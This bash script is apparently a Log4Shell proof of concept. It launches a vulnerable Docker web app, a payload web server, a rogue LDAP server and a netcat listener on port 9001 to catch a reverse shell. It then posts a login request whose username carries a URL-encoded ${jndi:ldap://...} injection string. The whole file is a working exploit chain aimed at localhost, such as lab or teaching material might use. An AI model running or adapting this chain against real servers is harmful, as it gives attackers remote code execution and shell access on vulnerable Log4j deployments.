#!/bin/bash

#docker build -t log4j-shell-poc ./GoFinance
xterm -e docker run --network host log4j-shell-poc &
xterm -e bash -c "cd WebServer && python webserver.py" &
xterm -e python LDAP/ldap.py &
xterm -e nc -lvp 9001

sleep 10
echo "Request sent !"
curl -X POST "http://localhost:8080/login" \
     -H "Host: localhost:8080" \
     -H "Content-Length: 65" \
     -H "Cache-Control: max-age=0" \
     -H "sec-ch-ua: " \
     -H "sec-ch-ua-mobile: ?0" \
     -H "sec-ch-ua-platform: \"\"" \
     -H "Upgrade-Insecure-Requests: 1" \
     -H "Origin: http://localhost:8080" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36" \
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" \
     -H "Sec-Fetch-Site: same-origin" \
     -H "Sec-Fetch-Mode: navigate" \
     -H "Sec-Fetch-User: ?1" \
     -H "Sec-Fetch-Dest: document" \
     -H "Referer: http://localhost:8080/" \
     -H "Accept-Encoding: gzip, deflate" \
     -H "Accept-Language: en-US,en;q=0.9" \
     -H "Cookie: JSESSIONID=D63B830390D913B657D2084E69A0775D" \
     -H "Connection: close" \
     --data "uname=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2Fa%7D&password="

